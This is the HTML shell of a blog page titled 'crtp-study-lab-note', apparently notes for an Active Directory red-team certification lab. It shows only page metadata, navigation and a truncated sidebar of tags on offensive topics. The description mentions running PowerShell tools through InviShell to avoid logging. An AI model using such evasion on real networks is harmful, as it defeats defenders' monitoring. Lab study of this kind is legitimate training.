<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-84TPQBH5EH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-84TPQBH5EH');
</script>
<!-- End Google Analytics -->

  
  

  
  <title>crtp-study-lab-note | ❀言わぬが花❀</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">

  <meta name="description" content="lab要注意的点 您可以使用网页浏览器或 OpenVPN 客户端访问本实验。更多详情， 请参阅“连接到实验”文档。   课程中使用的所有工具均可 在学生电脑的 C:\AD\Tools.zip中找到。您可以自由选择使用自己喜欢的工具。   除非另有说明，所有基于 PowerShell 的工具（尤其是用于枚举的工具）均使用 InviShell 执行，以避免冗长的日志记录。像 Rubeus.exe 这样">
<meta property="og:type" content="article">
<meta property="og:title" content="crtp-study-lab-note">
<meta property="og:url" content="http://example.com/2025/05/21/crtp-lab-note/index.html">
<meta property="og:site_name" content="❀言わぬが花❀">
<meta property="og:description" content="lab要注意的点 您可以使用网页浏览器或 OpenVPN 客户端访问本实验。更多详情， 请参阅“连接到实验”文档。   课程中使用的所有工具均可 在学生电脑的 C:\AD\Tools.zip中找到。您可以自由选择使用自己喜欢的工具。   除非另有说明，所有基于 PowerShell 的工具（尤其是用于枚举的工具）均使用 InviShell 执行，以避免冗长的日志记录。像 Rubeus.exe 这样">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wpimages/2025/crtp-lab-note/background.jpg">
<meta property="article:published_time" content="2025-05-21T10:41:34.000Z">
<meta property="article:modified_time" content="2025-06-05T17:42:03.078Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wpimages/2025/crtp-lab-note/background.jpg">
  
    <link rel="alternate" href="/atom.xml" title="❀言わぬが花❀" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.1.1"></head>

<script>



</script>
<body>
  
  
    
<div id="banner" class="">
  <img src="/images/backgroup.jpg" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="  ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>❀言わぬが花❀ </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
      </a>
    
    <div id="nav-menu-btn" class="nav-icon">
      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">Flower </div>
      <div class="dot"></div>
      <div class="subtitle">Hi Im Flower </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
    


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">13</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">10</div>
            </a>
        <div class="children"><div class="category-box">
            <a class="category-link" href="/categories/ctf/wiz/">
                wiz
                <div class="category-count">2</div>
            </a>
        </div></div>
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-8/">
                htb-Season-8
                <div class="category-count">3</div>
            </a>
        </div>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/2FA/" rel="tag">2FA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ADCS/" rel="tag">ADCS</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AllowedtoAct/" rel="tag">AllowedtoAct</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Below/" rel="tag">Below</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/C/" rel="tag">C#</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CI-CD/" rel="tag">CI&#x2F;CD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2022-29623/" rel="tag">CVE-2022-29623</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-36467/" rel="tag">CVE-2024-36467</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CVE-2024-42327/" rel="tag">CVE-2024-42327</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Command-injection/" rel="tag">Command injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Configuration/" rel="tag">Configuration</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CreateChild/" rel="tag">CreateChild</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/DLL/" rel="tag">DLL</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Dacl/" rel="tag">Dacl</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC1/" rel="tag">ESC1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ESC4/" rel="tag">ESC4</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ForceChangePassword/" rel="tag">ForceChangePassword</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Forensic/" rel="tag">Forensic</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GMSA/" rel="tag">GMSA</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GPO/" rel="tag">GPO</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GSSAPI/" rel="tag">GSSAPI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Gbbion/" rel="tag">Gbbion</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/GenericAll/" rel="tag">GenericAll</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HKLM/" rel="tag">HKLM</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/IDOR/" rel="tag">IDOR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Jenkins/" rel="tag">Jenkins</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/LFR/" rel="tag">LFR</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/NTHASH/" rel="tag">NTHASH</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nmap/" rel="tag">Nmap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Nodeport/" rel="tag">Nodeport</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Ntlmv1/" rel="tag">Ntlmv1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/OU/" rel="tag">OU</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKI-ADMIN/" rel="tag">PKI ADMIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PKINIT/" rel="tag">PKINIT</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PSReadLine/" rel="tag">PSReadLine</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PasstheCert/" rel="tag">PasstheCert</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/PetitPotam/" rel="tag">PetitPotam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Powershell/" rel="tag">Powershell</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pseudorandom/" rel="tag">Pseudorandom</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pyside2/" rel="tag">Pyside2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/RECYCLE-BIN/" rel="tag">RECYCLE.BIN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rogue-potato/" rel="tag">Rogue potato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube/" rel="tag">Roundcube</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Roundcube-Webmail/" rel="tag">Roundcube Webmail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Rubeus/" rel="tag">Rubeus</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SPN/" rel="tag">SPN</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SQL-injection/" rel="tag">SQL injection</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeBackupPrivilege/" rel="tag">SeBackupPrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SeImpersonatePrivilege/" rel="tag">SeImpersonatePrivilege</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Self/" rel="tag">Self</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Server-Operators/" rel="tag">Server Operators</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/SharPy/" rel="tag">SharPy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Shellcode/" rel="tag">Shellcode</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TOTP/" rel="tag">TOTP</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/TeamCity/" rel="tag">TeamCity</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Teamcity/" rel="tag">Teamcity</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tips/" rel="tag">Tips</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Tombstone/" rel="tag">Tombstone</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteGPlink/" rel="tag">WriteGPlink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/WriteOwner/" rel="tag">WriteOwner</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Zabbix/" rel="tag">Zabbix</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ansible-vault/" rel="tag">ansible_vault</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asp/" rel="tag">asp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/aws/" rel="tag">aws</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure/" rel="tag">azure</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azure-devops/" rel="tag">azure devops</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/azureAD/" rel="tag">azureAD</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bbot/" rel="tag">bbot</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/beacon/" rel="tag">beacon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/blockchain/" rel="tag">blockchain</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bloodhound/" rel="tag">bloodhound</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bookstack/" rel="tag">bookstack</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/browser/" rel="tag">browser</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-AMSI/" rel="tag">bypass AMSI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cme/" rel="tag">cme</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/consul/" rel="tag">consul</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/crtp/" rel="tag">crtp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/deb/" rel="tag">deb</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/defaultapppool/" rel="tag">defaultapppool</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnsadmin/" rel="tag">dnsadmin</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnschef/" rel="tag">dnschef</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dnstools/" rel="tag">dnstools</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/dpapi/" rel="tag">dpapi</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/edge/" rel="tag">edge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/efspotato/" rel="tag">efspotato</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc1/" rel="tag">esc1</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc14/" rel="tag">esc14</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/esc15/" rel="tag">esc15</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/exam/" rel="tag">exam</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fifo/" rel="tag">fifo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/firewall/" rel="tag">firewall</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fishing/" rel="tag">fishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gamepwn/" rel="tag">gamepwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ghost/" rel="tag">ghost</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/github/" rel="tag">github</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/gpo/" rel="tag">gpo</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/h2/" rel="tag">h2</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/hardhat/" rel="tag">hardhat</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/havoc/" rel="tag">havoc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-GetUserSPNs/" rel="tag">impacket-GetUserSPNs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/impacket-smbclient/" rel="tag">impacket-smbclient</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables/" rel="tag">iptables</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/iptables-save/" rel="tag">iptables-save</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ipv6/" rel="tag">ipv6</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ispconfig/" rel="tag">ispconfig</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jar/" rel="tag">jar</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/jwt/" rel="tag">jwt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/k8s/" rel="tag">k8s</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kcd/" rel="tag">kcd</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/krbrelayx/" rel="tag">krbrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/kube-proxy/" rel="tag">kube-proxy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/laps/" rel="tag">laps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldap/" rel="tag">ldap</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ldaps/" rel="tag">ldaps</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/limesurvey/" rel="tag">limesurvey</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/logon-script/" rel="tag">logon script</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/lsaquery/" rel="tag">lsaquery</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mail/" rel="tag">mail</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/merge/" rel="tag">merge</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/msDS-KeyCredentialLink/" rel="tag">msDS-KeyCredentialLink</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mssql/" rel="tag">mssql</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/mysqljs/" rel="tag">mysqljs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/neo4j/" rel="tag">neo4j</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/note/" rel="tag">note</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ntlmrelayx/" rel="tag">ntlmrelayx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/owa/" rel="tag">owa</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pdf/" rel="tag">pdf</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfishing/" rel="tag">pfishing</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pfx/" rel="tag">pfx</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pinns/" rel="tag">pinns</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/poc/" rel="tag">poc</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pod/" rel="tag">pod</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/pods/" rel="tag">pods</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgres/" rel="tag">postgres</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/postgresql/" 